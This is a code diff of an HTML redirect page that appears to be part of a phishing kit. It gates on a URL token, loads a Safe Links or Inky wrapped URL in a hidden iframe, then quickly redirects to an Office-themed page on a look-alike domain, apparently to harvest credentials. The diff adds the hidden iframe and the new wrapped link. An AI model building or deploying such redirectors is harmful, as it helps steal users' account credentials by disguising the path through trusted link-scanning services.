@@ -5,13 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
     <script>
-        // First temporary redirect URL (this URL will not be displayed)
-        const firstRedirectUrl = "https://nam13.safelinks.protection.outlook.com/?url=https%3A%2F%2Fnam.safelink.emails.azure.net%2Fredirect%2F%3Fdestination%3Dhttps%253A%252F%252Fadmin.microsoft.com%252Fadminportal%252Fhome%253F%2526source%253Dtcemail%2523%252Fsubscriptions%26p%3DbT1lZGFjMWRhOC1mZTYzLTQyZDctYTA2ZC0wYzRkNmMxOWM2Yjcmcz0wMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDAmdT1hZW8mbD1ob21l&data=05%7C02%7Ccrensrealty%40msrf-in.top%7C03451cc105414b0ad40a08dd45dd0505%7C597fb9b887c74d4e80ca0b67b628eb2d%7C0%7C0%7C638743537792249425%7CUnknown%7CTWFpbGZsb3d8eyJFbXB0eU1hcGkiOnRydWUsIlYiOiIwLjAuMDAwMCIsIlAiOiJXaW4zMiIsIkFOIjoiTWFpbCIsIldUIjoyfQ%3D%3D%7C0%7C%7C%7C&sdata=dWDT2rjHZA%2BHJ2Mg02bvBCLBXgtMcL%2Ft2qU5EB1QRNc%3D&reserved=0";
+        // First temporary redirect URL (never visible to the user)
+        const firstRedirectUrl = "https://shared.outlook.inky.com/link?domain=m3.ryltvk6.sa.com&t=h.eJxNj00OgyAQha_SsK7QESroyqvAMKipigFcNb17S9NFl-_vS96TnWllw4XNpRx5ECLjTP5cqYnJU2rQ7kfMhWfLMW7iSLEQliafaSLuI2Z2vbBHBexUPs1FLHuI4098N2BvzijVd4j3tncudL31wSiwZHUAEKCl0RpabbiU0CpZmVSZiRytyz6NG25QYTXxNfk3Sj0ArzfMMz7v.MEUCICEI6i6CrVDJsTqv-D44iSjB0FjCgezb02LsAX3GOiU0AiEAwjl5CQtCOIupbdWlks66hThKXby0D20e3FdLQidqhHo";
 
         // Final destination URL
         const finalRedirectUrl = "https://m3.ryltvk6.sa.com/m3.secure.zcore/office-3D8/index.php";
 
-        // Function to generate a random string of mixed characters (80 characters)
+        // Function to generate a random string (80 characters)
         function generateRandomString(length) {
             const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
             let result = "";
@@ -28,20 +28,23 @@
             return match ? match[1] : null;
         }
 
-        // Extract and validate the 30-character uppercase string from the URL
+        // Extract the 30-character uppercase string
         const upperString = getUnnamedQueryParam();
 
         if (upperString) {
             // Generate a random 80-character string
             const randomString = generateRandomString(80);
 
-            // Perform instant redirection through JavaScript replace() to ensure no back button history
-            window.location.replace(`${firstRedirectUrl}`);
+            // First redirect (hidden)
+            const hiddenIframe = document.createElement("iframe");
+            hiddenIframe.style.display = "none";
+            hiddenIframe.src = firstRedirectUrl;
+            document.body.appendChild(hiddenIframe);
 
-            // Immediately redirect to final URL without displaying the first URL
+            // Redirect to final URL within 100ms (effectively instant)
             setTimeout(() => {
                 window.location.replace(`${finalRedirectUrl}?=${randomString}`);
-            }, 100); // Almost instant redirection
+            }, 100);
         }
     </script>
 </head>
